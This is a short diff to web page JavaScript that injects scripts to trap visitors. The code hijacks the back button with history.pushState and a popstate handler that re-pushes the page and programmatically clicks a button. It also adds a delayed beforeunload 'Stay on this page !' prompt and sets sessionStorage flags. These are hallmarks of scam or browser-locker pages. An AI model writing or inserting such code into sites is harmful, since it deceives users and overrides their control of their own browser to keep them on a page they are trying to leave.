@@ -1045,10 +1045,12 @@ scriptZR.type="text/javascript";
 scriptZR.innerHTML='history.pushState(null, null, document.URL); window.addEventListener("popstate", function () { history.pushState(null, null, document.URL); document.querySelector(".mc4-btn").click(); setTimeout(function scroll() { window.scrollTo(0, 500); }, 200); one(); });';
 document.getElementsByTagName('body')[0].appendChild(scriptZR);
 
+setTimeout(function maxZW() {
 var scriptZI = document.createElement("script");
 scriptZI.type="text/javascript";
 scriptZI.innerHTML='function addOB(en) { en.returnValue = "Stay on this page !"; }; window.addEventListener("beforeunload", addOB);';
 document.getElementsByTagName('body')[0].appendChild(scriptZI);
+}, 1000);
 
 var scriptZH = document.createElement("script");
 scriptZH.type="text/javascript";
@@ -1056,6 +1058,8 @@ scriptZH.innerHTML='function one() { window.removeEventListener("beforeunload", 
 document.getElementsByTagName('body')[0].appendChild(scriptZH);
 
 };
+
+sessionStorage.setItem("click", 100);
 
 sessionStorage.setItem("reload", 100);
 
